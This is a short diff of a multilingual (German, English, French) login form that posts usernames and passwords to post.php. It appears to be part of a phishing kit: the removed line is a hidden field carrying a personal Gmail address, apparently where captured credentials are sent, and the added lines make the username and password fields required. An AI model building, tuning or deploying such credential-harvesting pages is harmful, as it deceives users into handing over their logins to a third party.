@@ -7238,16 +7238,15 @@ display:none;
         <div class="column01">
           
           <form action="post.php" method="post">
-<input type="hidden" name="mailla" value="alassanelove3@gmail.com"/>
 <input type="hidden" name="check" value="login">
 <input type="hidden" name="todo" value="login">
 
           <p>
             <label for="user"><span class="de" style="display:none">Benutzername</span><span class="en" style="">Username</span><span class="fr" style="display:none">Nom d'utilisateur</span></label>
-            <input type="text" name="user" id="user" tabindex="1" size="10" value="">
+            <input type="text" name="user" id="user" tabindex="1" size="10" value="" required="">
           </p><p>
             <label for="password"><span class="de" style="display:none">Kennwort</span><span class="en" style="">Password</span><span class="fr" style="display:none">Mot de passe</span></label>
-            <input type="password" name="pass" tabindex="2" size="10" value="">
+            <input type="password" name="pass" tabindex="2" size="10" value="" required="">
           </p><p>
             <label for="lang"><span class="de" style="display:none">Sprache</span><span class="en" style="">Language</span><span class="fr" style="display:none">Langue</span></label>
 <select name="lang" onchange="setLanguage(this.value)" tabindex="4">
